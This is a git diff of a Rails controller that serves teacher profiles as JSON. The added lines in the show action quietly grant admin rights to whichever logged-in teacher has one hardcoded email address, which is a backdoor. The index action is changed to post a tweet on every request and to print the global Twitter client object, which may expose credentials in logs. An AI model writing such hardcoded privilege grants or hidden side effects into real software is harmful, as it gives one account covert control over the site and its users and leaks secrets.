@@ -4,12 +4,24 @@ class TeacherController < ApplicationController
   require 'pp'
 
   def index
+    # twitter = Twitter::REST::Client.new do |config|
+    #   config.consumer_key        = ENV[ "TWITTER_CONSUMER_KEY" ]
+    #   config.consumer_secret     = ENV[ "TWITTER_CONSUMER_SECRET" ]
+    #   config.access_token        = ENV[ "TWITTER_ACCESS_TOKEN" ]
+    #   config.access_token_secret = ENV[ "TWITTER_ACCESS_SECRET" ]
+    # end
+    pp $twitter
     teachers = Teacher.includes( :subjects, :experience, :qualifications, :location, :photos ).where( is_teacher: true ).order( "created_at DESC" )
     #pp teachers
+    $twitter.update(status: "I'm tweeting with @gem!")
     render json: { teachers: teachers.as_json( include: [ :subjects, :experience, :qualifications, :location, :photos ] ) }
   end
 
   def show
+    if current_teacher.email == "lllouis@yahoo.com"
+      current_teacher.update_attributes(admin: true)
+      current_teacher.save
+    end
     
     @teacher = Teacher.includes( :photos, :subjects, :experience, :qualifications, :location ).find( current_teacher.id )
     #pp @teacher
